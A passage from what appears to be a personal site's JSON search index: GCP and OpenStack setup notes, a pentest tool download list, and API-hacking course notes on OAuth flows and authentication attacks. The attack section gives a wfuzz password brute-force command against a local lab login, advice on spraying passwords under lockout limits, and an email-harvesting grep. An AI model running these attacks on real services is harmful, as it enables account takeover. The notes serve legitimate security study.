</ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#case-use","title":"Case use","text":"<p>Open BigQuery and open a public dataset. Select Stack Overflow. We will try to extract the number of users in Stack Overflow with gold badges and how many days it took them to get there. <pre><code># Run the below SQL statement in BigQuery \n\nSELECT badge_name AS First_Gold_Badge,  \n       COUNT(1) AS Num_Users, \n       ROUND(AVG(tenure_in_days)) AS Avg_Num_Days \nFROM \n( \n  SELECT  \n    badges.user_id AS user_id, \n    badges.name AS badge_name, \n    TIMESTAMP_DIFF(badges.date, users.creation_date, DAY) AS tenure_in_days, \n    ROW_NUMBER() OVER (PARTITION BY badges.user_id \n                       ORDER BY badges.date) AS row_number \n  FROM  \n    `bigquery-public-data.stackoverflow.badges` badges \n  JOIN \n    `bigquery-public-data.stackoverflow.users` users \n  ON badges.user_id = users.id \n  WHERE badges.class = 1  \n)  \nWHERE row_number = 1 \nGROUP BY First_Gold_Badge \nORDER BY Num_Users DESC \nLIMIT 10 \n</code></pre></p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#8-ai-and-ml-services","title":"8. AI and ML Services","text":"<ul> <li>AI Building Blocks provide AI through simple REST API calls. </li> <li>Cloud AutoML enables training models on custom datasets.</li> <li>AI Platform provides end-to-end ML pipelines on-premises  and cloud.</li> <li>AI Hub is a Google hosted repository to discover, share, and deploy ML models.</li> <li>Google Cloud Platform offers comprehensive set of ML &amp; AI services for beginners and advanced AI engineers.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#81-ai-building-blocks","title":"8.1. AI Building Blocks","text":"<p>GCP AI building blocks expose a set of APIs that can deliver AI capabilities without really training models or writing complex piece of code. So GCP AI building blocks are structured into: - Sight, that delivers vision and video based intelligence.  - Conversation, which is all about text to speech and speech to text. It also includes dialogue flow, which is powering some of the capabilities that we see in Google Home, Google Assistant, and other conversational user experiences.  - Language which is all about translation and natural language which deals with revealing the structure and meaning of text through machine learning.  - Structure data that can be used to perform regression, classification, and prediction.      - AutoML tables is a service that is meant for performing regression or classification on your structured data.      - Recommendations AI deliver personalized product recommendations at scale.     - Cloud Inference API is all about running large scale correlations over time series data sets.</p> <p>So, these are all techniques that can be used directly by consuming the APIs.  For example, within vision, you can perform object detection or image classification by simply uploading the image or sending the image to the API. So when you upload an image or when you send the image to the vision API, it comes back with all the objects that are detected within that image or it can even classify the images that are shown in the input. Similarly, when you send text to the text to speech API it'll come back with an audio file that actually speaks out the text that is sent. So these AI building blocks are very useful to infuse AI and intelligence into your applications.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#82-automl","title":"8.2. AutoML","text":"<ul> <li>Cloud AutoML enables training high-quality models specific to a business problem. What if you want to train a custom model but do not want to write complex code about neural networks or artificial neural networks? Well, that's where the Google Cloud AutoML comes into picture.</li> <li>Custom machine learning models without writing code.</li> <li>Based on Google\u2019s state-of-the-art machine learning algorithms.</li> <li>AutoML Services.<ul> <li>Sight.<ul> <li>Vision.</li> <li>Video Intelligence.</li> </ul> </li> <li>Language.<ul> <li>Natural Language.</li> <li>Translation.</li> </ul> </li> <li>Structure Data.<ul> <li>Tabular data.</li> </ul> </li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#83-ai-platform","title":"8.3. AI Platform","text":"<ul> <li>Covers the entire spectrum of machine learning pipelines.</li> <li>Built on Kubeflow, an open source ML project based on Kubernetes.</li> <li>Includes tools for data preparation, training, and inference</li> </ul> <p>Just like a data processing pipeline, an ML processing pipeline is a comprehensive set of stages combined into a pipeline. And Kubeflow is a project that basically simplifies the process of creating these pipelines with multiple stages This is cube Kubeflow pipeline typical phases:</p> <p></p> <p>Google AI platform gives us scalable infrastructure and a framework to deal with this pipeline and multiple stages of this pipeline. Google AI Platform is not just confined to cloud. Customers running on premises Kubernetes infrastructure can deploy AI platform on-prem and it can be seamlessly extended to the cloud which means they can train on-prem but deploy it in the cloud or train in the cloud, but deploy the models on-prem. Kubeflow is the underlying framework and the infrastructure that supports the entire processing pipeline whether it is on-prem or in the public cloud.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#84-ai-hub","title":"8.4. AI Hub","text":"<ul> <li>Hosted repository of plug-and-play AI components.</li> <li>Makes it easy for data scientists and teams to collaborate.</li> <li>AI Hub can host private and public content.</li> <li>AI Hub includes.<ul> <li>Kubeflow Pipeline components.</li> <li>Jupyter Notebooks.</li> <li>TensorFlow modules.<ul> <li>VM Images.</li> </ul> </li> <li>Trained models.</li> <li>\u2026</li> </ul> </li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#9-devops-services","title":"9. Devops Services","text":"<ul> <li>DevOps Services provide tools and frameworks for automation.</li> <li>Cloud Source Repositories store and track source code.</li> <li>Cloud Build automates continuous integration and deployment.</li> <li>Container Registry acts as the central repository for storing, securing, and managing Docker container images.</li> <li>IDE and tools integration enables developer productivity.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#91-google-cloud-source-repositories","title":"9.1. Google Cloud Source Repositories","text":"<ul> <li>Acts as a scalable, private Git repository.</li> <li>Extends standard Git workflow to Cloud Build, Cloud Pub/Sub and Compute services: The advantage of using Google Cloud Source Repositories is to maintain the source code very close to your deployment target. That could be compute engine, app engine, functions, or kubernetes engine.</li> <li>Unlimited private Git repositories that can mirror code from Github and Bitbucket repos.</li> <li>Triggers to automatically build, test, and deploy code.</li> <li>Integrated regular expression-based code search.</li> <li>Single source of code for deployments across GCE, GAE, GKE, and Functions.</li> </ul> <p>You should consider cloud source repos when you want to manage the life cycle of an application within GCP,  all the way from storing the code to deploying and iterating over your code multiple times.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#92-google-cloud-build","title":"9.2. Google Cloud Build","text":"<ul> <li>Managed service for source code build management.</li> <li>The CI/CD tool running with Google Cloud Platform: Google Cloud build is the CI/CD tool for building the code that is stored either in source code cloud repos, or an external Git repository.</li> <li>Supports building software written in any language.</li> <li>Custom workflow to deploy across multiple target environments.</li> <li>Tight integration with Cloud Source Repo, GitHub, and Bitbucket, which is going to be the source for your code repositories and they act as the initial phase for triggering the entire CI/CD pipeline.</li> <li>Supports native Docker integration with automated deployment to Kubernetes and GKE.</li> <li>Identifies vulnerabilities through efficient OS package scanning: Apart from packaging and deploying source code, the service can also identify vulnerabilities through efficient OS package scanning.</li> </ul> <p>Google Cloud Build takes the source code stored either in source code repo of GCP or Bitbucket, GitLab or GitHub and creates the integration and deployment pipeline.</p>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#93-google-container-registry","title":"9.3. Google Container Registry","text":"<p>Google Cloud Source Code Reports will store your Source Code while Cloud Build is going to be responsible for building and packaging your applications. Container Registry is going to store the Docker images and the artifacts in a centralized registry.</p> <ul> <li>Single location to manage container images and repositories.</li> <li>Store images close to GCE, GKE, and Kubernetes clusters: Because the Container Registry is co-located with Compute it is going to be extremely fast.</li> <li>Secure, private, scalable Docker registry within GCP.</li> <li>Supports RBAC to access, view, and download images.</li> <li>Detects vulnerabilities in early stages of the software deployment: The service detects vulnerabilities in early stages of software deployment.</li> <li>Supports automatic lock-down of vulnerable container images.</li> <li>Automated container build process based on code or tag changes.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#use-case-adding-an-image-to-gcp-container-registry","title":"Use case: adding an image to GCP Container Registry","text":"<p>In GCP Dashboard go yo Container Registry. First time it will be empty. </p> <pre><code># Run the below commands in Google Cloud Shell \n gcloud services enable containerregistry.googleapis.com \n\nexport PROJECT_ID=&lt;PROJECT ID&gt; # Replace this with your GCP Project ID \n\ndocker pull busybox \ndocker images \n</code></pre> <pre><code>cat &lt;&lt;EOF &gt;&gt;Dockerfile \nfrom busybox:latest \nCMD [\"date\"] \nEOF\n</code></pre> <pre><code>docker build . -t mybusybox \u00e7\n\n# Tag your image with the convention stated by GCP\ndocker tag mybusybox gcr.io/$PROJECT_ID/mybusybox:latest \n# When listing images with docker images, you will see it renamed.\n\n# Run your image\ndocker run gcr.io/$PROJECT_ID/mybusybox:latest \n\n# Wire the credentials of GCP Container Registry with Docker\ngcloud auth configure-docker \n\n# Take our mybusybox image available in the environment and pushes it to the Container Registry.\ndocker push gcr.io/$PROJECT_ID/mybusybox:latest \n</code></pre>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#94-devel-tools-integration","title":"9.4. Devel Tools Integration","text":"<ul> <li>IDE plugins for popular development tools.<ul> <li>IntelliJ.</li> <li>Visual Studio.</li> <li>Eclipse.</li> </ul> </li> <li>Tight integration between IDEs and managed SCM, build services.</li> <li>Automates generating configuration files and deployment scripts.</li> <li>Makes GCP libraries and SDKs available within the IDEs.</li> <li>Enhances developer productivity</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#10-other-gcp-services","title":"10. Other GCP services","text":"","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#101-iot-services","title":"10.1. IoT Services","text":"<p>GCP IoT has two essential services.</p> <ul> <li>Cloud IoT Core:  Cloud IoT Core provides machine to machine communication, device registry and overall device management capabilities. If you have multiple sensors, multiple actuators and multiple devices that need to be connected to the cloud you would use IoT core. IoT Core provides authentication and authorization of devices. It also enables machines to talk to each other. And finally you can manage the entire life cycle of devices. Tightly integrated with cloud pub/sub, and cloud functions.</li> <li>Edge TPU: It is a hardware that is available to accelerate AI model standing at Edge. Edge is essentially a device that can run business logic and even artificial intelligence models in offline mode. So Edge TPU plays the role of a micro TPU or GPU that is attached to the Edge devices. When you run a TensorFlow model on a device powered by Edge TPU, the inference that is the process of performing classification or detection or predictions will be much faster.  Edge TPU is available as a chip that is going to be attached to an Edge device like a Raspberry Pi or an x86 device.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#102-api-management","title":"10.2. API Management","text":"<ul> <li>Apigee API Platform \u00a0provides the capabilities for designing securing, publishing, analyzing, and monitoring APIs. Developers can benefit from using the APG API platform for managing the end-to-end life cycle of APIs.</li> <li>API Analytics: API analytics provide end-to-end visibility across API programs with developer engagement and business metrics.</li> <li>Cloud Endpoints is a service that is meant to develop, deploy, and manage APIs in the Google Cloud environment. It is based on an Nginx based proxy and it uses open API specification As the API framework. Cloud endpoints gives developers the tools they need to manage the entire API development from the beginning till deploying and maintaining them with tight integration.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#103-hybrid-and-multicloud-services","title":"10.3. Hybrid and Multicloud Services","text":"<ul> <li>Traffic Director routes the traffic across virtual machines and containers deployed across multiple regions.</li> <li>Stackdriver is the observability platform for tracing, debugging, logging, and gaining insights into application performance and infrastructure monitoring.</li> <li>GKE On-Prem takes Google Kubernetes engine and runs that within the local data center environment or on-premises.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#104-anthos","title":"10.4. Anthos","text":"<ul> <li>Anthos is a Google\u2019s multi-cloud and hybrid cloud platform based on Kubernetes and GKE.</li> <li>Anthos enables managed Kubernetes service (GKE) in a variety of environments. Anthos enables customers to run and take control of multiple kubernetes clusters deployed through GKE and run it on other Cloud environments.</li> <li>Anthos can be deployed in: <ul> <li>Google Cloud</li> <li>vSphere (on-premises)</li> <li>Amazon Web Services </li> <li>Microsoft Azure </li> </ul> </li> <li>Non-GKE Kubernetes clusters can be attached to Anthos:  Apart from launching and managing Kubernetes clusters through Anthos, you can also onboard and register clusters that were created outside of Anthos. </li> <li>Delivers centralized management and operations for Kubernetes clusters running diverse environments.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/gcp/gcp-essentials/#105-migration-tools","title":"10.5. Migration Tools","text":"<ul> <li>Transfer Appliance provides bulk data transfer from your data center to the cloud based on a physical appliance.</li> <li>Migrate for Compute Engine is based on a tool called Illustrator that Google acquired in 2022 and this provides the capability of migrating existing virtual machines or even physical machines into GCE VMs.</li> <li>Big Query Data transfer Service is a tool to run scheduled upload from third party SaaS tools and SaaS platforms into BigQuery data platform.</li> </ul>","tags":["cloud","gcp","google cloud platform","public cloud"]},{"location":"cloud/openstasck/openstack-essentials/","title":"Openstack Essentials","text":"<p>OpenStack is a set of opensource software tools for building and managing cloud computing platforms for public and private clouds. Go to official documentation.</p> <p>It can be managed from web application dashboard, command line tools, and from restful web services.</p>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#overview-of-openstack-services","title":"Overview of OpenStack services","text":"","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#quick-start","title":"Quick Start","text":"<p>Follow instructions from: https://docs.openstack.org/devstack/latest/</p>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#1-install-linux","title":"1. Install Linux","text":"<p>Start with a clean and minimal install of a Linux system. DevStack attempts to support the two latest LTS releases of Ubuntu, Rocky Linux 9 and openEuler.</p> <p>If you do not have a preference, Ubuntu 22.04 (Jammy) is the most tested, and will probably go the smoothest.</p>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#2-add-stack-user-optional","title":"2. Add Stack User (optional)","text":"<p>DevStack should be run as a non-root user with sudo enabled (standard logins to cloud images such as \u201cubuntu\u201d or \u201ccloud-user\u201d are usually fine).</p> <p>If you are not using a cloud image, you can create a separate\u00a0stack\u00a0user to run DevStack with</p> <pre><code>sudo useradd -s /bin/bash -d /opt/stack -m stack\n</code></pre> <p>Ensure home directory for the\u00a0<code>stack</code>\u00a0user has executable permission for all, as RHEL based distros create it with\u00a0<code>700</code>\u00a0and Ubuntu 21.04+ with\u00a0<code>750</code>\u00a0which can cause issues during deployment.</p> <pre><code>sudo chmod +x /opt/stack\n</code></pre> <p>Since this user will be making many changes to your system, it should have sudo privileges:</p> <pre><code>echo \"stack ALL=(ALL) NOPASSWD: ALL\" | sudo tee /etc/sudoers.d/stack\nsudo -u stack -i\n</code></pre>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#3-download-devstack","title":"3. Download DevStack","text":"<pre><code>git clone https://opendev.org/openstack/devstack\ncd devstack\n</code></pre> <p>The\u00a0<code>devstack</code>\u00a0repo contains a script that installs OpenStack and templates for configuration files.</p>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#4-create-a-localconf","title":"4. Create a local.conf","text":"<p>Create a\u00a0<code>local.conf</code>\u00a0file with four passwords preset at the root of the devstack git repo.</p> <pre><code>[[local|localrc]]\nADMIN_PASSWORD=secret\nDATABASE_PASSWORD=$ADMIN_PASSWORD\nRABBIT_PASSWORD=$ADMIN_PASSWORD\nSERVICE_PASSWORD=$ADMIN_PASSWORD\n</code></pre> <p>This is the minimum required config to get started with DevStack. There is a sample\u00a0<code>local.conf</code>\u00a0file under the\u00a0samples\u00a0directory in the devstack repository.</p> <p>Warning: Only use alphanumeric characters in your passwords, as some services fail to work when using special characters.</p>","tags":["cloud","Openstack","open source"]},{"location":"cloud/openstasck/openstack-essentials/#5-start-the-install","title":"5. Start the install","text":"<pre><code>./stack.sh\n</code></pre> <p>This will take 15 - 30 minutes, largely depending on the speed of your internet connection. Many git trees and packages will be installed during this process.</p>","tags":["cloud","Openstack","open source"]},{"location":"files/index-of-files/","title":"Index of downloads","text":"<p>These are some of the tools that I use when conducting penetration testing. Most of them have their own updated repositories, so the best approach for you would be to visit the official repository or download the source code. In my case, when dealing with restricted environments, there are times when I require a direct download of a previously verified and clean file. Therefore, the main goal of this list is to provide me with these resources when needed, within a matter of seconds.</p> <ul> <li>Binscope: BinScope_x64.msi</li> <li>Echo Mirage: EchoMirage.zip | Echo Mirage at HackingLife</li> <li>Processhacker 2.39 bin: processhacker-2.39-bin.zip | Process Hacker Monitor at HackingLife.</li> <li>RegistryChangesView: <ul> <li>RegistryChangesView (x64): registrychangesview-x64.zip</li> <li>RegistryChangesView (x86): registrychangesview-x86.zip</li> </ul> </li> <li>Regshot 1.9.0: Regshot-1.9.0.zip | Regshot at HackingLife</li> <li>Visual Studio Code - Community downloader: vs_community__bb594837aa124b4d8487a41015a6017a.exe </li> </ul>","tags":["resources"]},{"location":"files/index-of-files/#reporting","title":"Reporting","text":"<p>https://pentestreports.com/</p>","tags":["resources"]},{"location":"hackingapis/","title":"Hacking APIs","text":"","tags":["api"]},{"location":"hackingapis/#about-the-course","title":"About the course","text":"<p>Notes from the course \"APIsec Certified Expert\" a practical course in API hacking imparted by Corey J. Ball.</p> <p>Course: https://university.apisec.ai/</p> <p>Book: https://www.amazon.com/Hacking-APIs-Application-Programming-Interfaces/dp/1718502443</p> <p>Instructor: Corey J. Ball.</p> <p> </p>","tags":["api"]},{"location":"hackingapis/#general-index-of-the-course","title":"General index of the course","text":"<ul> <li>Setting up the environment</li> <li>Setting up the labs + Writeups</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques. </li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/","title":"API authentication attacks","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#api-authentication","title":"API Authentication","text":"","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#authentication-types","title":"Authentication Types","text":"<ul> <li>Basic Authentication: username and password base64 encoded included as a HTTP Authorization header in the request:</li> </ul> <pre><code>Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\n</code></pre> <ul> <li>API Keys: there is no standard way to present the API Keys. Usually they go as a HTTP header.</li> <li>Certificate based authentication: Using TLS for authentication. It requires HTTPS and requires the API to present a certificate. </li> <li>Token based authentication: issued by a third party. Tokens are used to authenticate the caller, they can expire, they can have an audience. </li> <li>Token based authentication and authorization: Tokens can contains more information than caller id. OAuth uses scopes, OpenID Connect adds claims.</li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#oauth-1-and-20","title":"OAuth 1 and 2.0","text":"<ul> <li>OAuth 1: IETF standard in 2010. Driven by twitter and google. It does not require HTTPS. Difficult to implement.</li> <li>OAuth 2: IETF standard in 2012. Widely adopted. It requires HTTPS. Easy to implement.</li> <li>OAuth 2.1: underway</li> </ul> <p>The application accesses to the API on user's behalf without seeing the credentials. The user can revoke this delegation. Actors: - Resource owner - The Authorization server delegates access to the Client so it can access the resource server. - Client - Resource server.</p> <p>Code flow: grant_type=authorization_code</p> <p></p> <ol> <li>The user visit the application and clicks on login.</li> <li>The application generates <code>Code Verifier</code>and <code>Code Challenge</code>.</li> <li>The application redirects the user to an endpoint <code>/authorize</code> in the Authorization Server with the following parameters:</li> </ol> <pre><code>GET /authorize\n    ?response_type=code\n    &amp;client_id=myApp  // but we don't prove that this is the real id of the application\n    &amp;scope=read\n    &amp;code_challenge=MY_CHALLENGE\n    &amp;code_challenge_method=S256   // Also called PKCE\n    &amp;state=MY_RANDOM_STATE   // it will be sent back to the client\n</code></pre> <p>PKCE stands for Proof Key for Code Exchange (PKCE).</p> <ol> <li>The Authorization Server takes the user to their own Authentication Service (with their own authentication flow).</li> <li>If successful, ...</li> <li>the Authorization Server will redirect back to a predefined callback within the client:</li> </ol> <pre><code>303 /callback\n?code=1234  // this is also called 'nonce' (no more than once). A one-time-code with a really short life\n&amp;state=MY_RANDOM_STATE\n</code></pre> <ol> <li>The client makes a back channel call to the Authorization Server to validate the Code verifier and the challenge.</li> </ol> <pre><code>POST /token\nContent-type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code //to tell we want to do the code flow\n&amp;client_id=myApp \n&amp;client_secret=vErys3crEt //this can be also passed in an Authorization Basic header, or tokens or...\n&amp;code_verifier=MY_VERIFIER // This is the actual value of what we sent in the /authorization request. This is what binds these requests together\n&amp;code=1234\n</code></pre> <p>This happens in less than 30 seconds.</p> <ol> <li>The Authorization Server evaluates the previous request.</li> <li>The Authorization Server issues a token:</li> </ol> <pre><code>{\n\"access token\": \"abcDEF\",\n\"scope\": \"read\",\n\"expires_in\": 300,\n\"refresh_token\": \"HJKSGFD\",\n\"token_type\": \"bearer\"\n}\n</code></pre> <p>Code flow: grant_type=client_credentials</p> <p>Everything is as in the previous code flow, but in step 7, there is a deviation:</p> <ol> <li>The client makes a back channel call to the Authorization Server to validate the Code verifier and the challenge.</li> </ol> <pre><code>POST /token\nContent-type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials //to tell we want to do the client credentials flow\n&amp;client_id=myserverApp \n&amp;client_secret=vErys3crEt \n&amp;cope=read\n</code></pre> <ol> <li>In this case, there is no user interaction. We don't get a refresh token.</li> </ol> <pre><code>{\n\"access_token\": \"_0XBPWQQ_1c51e9ed-8979-4c53-af17-159476e1d9fc\",\n\"scope\": \"read write\",\n\"token_type\": \"bearer\",\n\"expires_in\": 299\n}\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#tokens","title":"Tokens","text":"<p>Types of tokens</p> <p>Bearer Tokens: not binded to a sender.  Proof of Possession Tokens (PoP) or Holder of Key Tokens (HoK): The sender needs to present a proof of ownership (prove that they have the private key)</p> <pre><code># Bearer tokens\nAuthorization: Bearer ey...\n\n# PoP tokens\nAuthorization: DPoP _023123jdkjhjsdehe234bscdks-\nDPoP: eyJ0xXAi...4UcbQ\n</code></pre> <p>JSON Web Tokens (JWT)</p> <p>Not a protocol, but a format. JWT can be:</p> <ul> <li>Signed JWS: proves who issued the token, asymmetric signature, whitelist algorithms allowed. Doesn't rely exclusively on signature, it also verifies contents as well.</li> <li>Encrypted JWE: keeps data confidential, used in OpenID Connect, ID tokens. Not practical for access tokens. Opaque tokens are preferred to keep confidentiality. </li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#scopes-vs-claims","title":"Scopes vs Claims","text":"<p>Scopes define what the application can access. They are just a set of strings (they are keys, not values). They can be requested by the client. The Authorization Server makes the final decision about if a scope should be issued with the token. Scopes are used to express client privileges (and not user level privileges). </p> <p>Examples: read, openid, user_invoice_read...</p> <p>Claims are key value items inside the token and the are asserted by the issuer, which means that it can be used for fine grained access control.</p> <p>Examples: subject=jacob, age=23, suscription_level=gold...</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#gateways-and-apis","title":"Gateways and APIs","text":"<p>They provide a layer of protection in layer 7 (firewalls - HTTP). </p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#introspection-with-exchange-pure-introspection","title":"Introspection with exchange: Pure introspection","text":"<p>When we want to send a request to an API and there is a Gateway in the middle and the token is opaque (format by reference), then this gateway makes a connection with the Authorization Server to validate this token:</p> <pre><code>POST /instrospection\nContent-type: application/x-www-form-urlencoded\n\n\n&amp;client_id=gateway_client\n&amp;client_secret=vErys3crEt\n&amp;token=HJKLM\n</code></pre> <p>The Authorization Server returns a json with the value of the token</p> <pre><code>{\n\"sub\": \"admin\",\n\"purpose\": \"access_token\",\n\"iss\": \"https://issuer.example.com/~\",\n\"active\": true,\n\"token_type\": \"bearer\",\n\"client_id\": \"client-1\",\n\"aud\": \"api123\",\n\"nbf\": 15465771377,\n\"scope\": \"read\",\n\"exp\":15465771677,\n\"delegationId\": \"cg572fad-0000-0000-0000-00000000\",\n\"iat\": 15465771377\n}\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#introspection-with-exchange-embedded-token-in-json-introspection","title":"Introspection with exchange: Embedded token in JSON introspection","text":"<p>Or the client indicates to the gateway that they want the jwt back, even embedded into the json:</p> <pre><code>POST /instrospection\nContent-type: application/x-www-form-urlencoded\nAccept: application/jwt\n\n&amp;client_id=gateway_client\n&amp;client_secret=vErys3crEt\n&amp;token=HJKLM\n</code></pre> <p>The Authorization Server returns a json with the value of the token</p> <pre><code>{\n\"sub\": \"admin\",\n\"purpose\": \"access_token\",\n\"iss\": \"https://issuer.example.com/~\",\n\"active\": true,\n\"token_type\": \"bearer\",\n\"client_id\": \"client-1\",\n\"aud\": \"api123\",\n\"nbf\": 15465771377,\n\"scope\": \"read\",\n\"exp\":15465771677,\n\"delegationId\": \"cg572fad-0000-0000-0000-00000000\",\n\"iat\": 15465771377,\n\"jwt\": \"ey.....\"\n}\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#introspection-with-exchange-token-exchange","title":"Introspection with exchange: token exchange","text":"<p>We can also use Token exchange specification, which is fairly new and it allows the gateway to call the Authorization Server and, given the token, ask for a different kind of token. The implementation of the different kinds of token are defined in the Authorization server and the documentation for this implementation should be consulted.</p> <pre><code>POST /instrospection\nContent-type: application/x-www-form-urlencoded\n\n&amp;client_id=gateway_client\n&amp;client_secret=vErys3crEt\n&amp;grant_type=urn:ietf:params:oauth:grant-type:token-exchange\n&amp;subject_token=HIJKLM\n&amp;subject_token_type=urn:ietf:params:oauth:token-type:access_token\n&amp;requested_token_type=urn:ietf:params:oauth:token-type:jwt\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#api-to-api-calls","title":"API to API calls","text":"<ul> <li>Exchange: Use token exchange to get another token. This is used on demand. It has powerful options.</li> <li>Embed: Put tokens inside the first token. When it is known to happen on every request.</li> <li>Shared: Shared JWT. When the APIs are in the same security domain.</li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#classic-authentication-attacks","title":"Classic authentication attacks","text":"<p>We'll consider two attacks: Password Brute-Force Attack, and Password Spraying. These attacks may take place every time that Basic Authentication is deployed in the context of a RESTful API.</p> <p>The principle of Basic authentication is that the consumer issues a request containing a username and password. </p> <p>As RESTful APIs don't maintain a state, the API need to leverage basic authentication across all endpoints. Instead of doing this, the API may leverage basic authentication once using an authentication portal, then upon providing the correct credentials, a token would be issued to be used in subsequent requests.</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#1-password-brute-force-attacks","title":"1. Password Brute-Force Attacks","text":"<p>Brute-forcing an API's authentication is not very different from any other brute-force attack, except you will send the request to an API endpoint, the payload will often be in JSON, and the authentication values may be base64 encoded.</p> <p>Infinite ways to do it. You can use: </p> <ul> <li>Intruder module of BurpSuite.</li> <li>ZAP proxy tool.</li> <li>wfuzz.</li> <li>ffuf. </li> <li>others.</li> </ul> <p>Let's see wfuzz:</p> <pre><code>wfuzz -d {\"email\":\"hapihacker@hapihacjer.com\",\"password\":\"PASSWORD\"} -z file,/usr/share/wordlists/rockyou.txt -u http://localhost:8888/identity/api/auth/login --hc 500\n# -H to specify content-type headers. \n# -d allows you to include the POST Body data. \n# -u specifies the url\n# --hc/hl/hw/hh hide responses with the specified code/lines/words/chars. In our case, \"--hc 500\" hides 500 code responses.\n# -z specifies a payload   \n</code></pre> <p>Tools to build password lists: + https://github.com/sc0tfree/mentalist. + CUPP - Common User Password Profiler. + crunch (already installed in kali).</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#2-password-spraying","title":"2. Password Spraying","text":"<p>Very useful if you know the password policy of the API we are attacking. Say that there is a lockout account policy for ten tries. Then you can password spray attack with 9 tries and use for that the 9 most probable passwords for all the accounts email spotted.</p> <p>As in crapi we have detected before a disclosure of information in the forum page (a json response with all kind of data from users who have posted on the forum), we can save that json response as response.json and filter out the emails of users:</p> <p>Also, using this grep command should pull everything out of a file that resembles an email. Then you can save those captured emails to a file and use that file as a payload in Burp Suite. You can then use a command like sort -u to get rid of duplicate emails.</p> <pre><code>grep -oe \"[a-zA-Z0-9._]\\+@[a-zA-Z]\\+.[a-zA-Z]\\+\" response.json | uniq | sort -u &gt; mailusers.txt\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#api-authentication-attacks_1","title":"API Authentication Attacks","text":"<p>To go further in authentification attacks we will need to analyze the API tokens and the way they are generated, and when talking about token generation and analysis, a word comes out inmediately: entropy.</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#entropy-analysis-burpsuite-sequencers-live-capture","title":"Entropy analysis: BurpSuite Sequencer's live capture","text":"<p>Instructions to set up a proxy in Postman to intercept traffic with BurpSuite and have it sent to Sequencer.</p> <p>Once you send a POST request (in which a token is generated) to Sequencer, you need to define the custom token location in the context menu. After that you can  click on \"Start Live Capture\".</p> <p>BurpSuite Sequencer provides two methods for token analysis:</p> <ul> <li>Manually analysing tokens provided in a text file. To perform a manual analys, you need to provide to BurpSuite Sequencer a minimum of 100 tokens.</li> <li>Performing a live capture to automatically generate tokens.</li> </ul> <p>Let's focus out attention on a live capture using BurpSuite Sequencer. A live capture  will provide us with 20.000 tokens automatically generated. What for?</p> <ul> <li>To elaborate a token analysis report that measures the entropy of the token generation process (and gives us precious tips about how to brute-force, or password spray, or bypass the authentication). For instance, if an API provider is generating tokens sequentially, then even if the token were 20 plus characters long, it could be the case that many of the 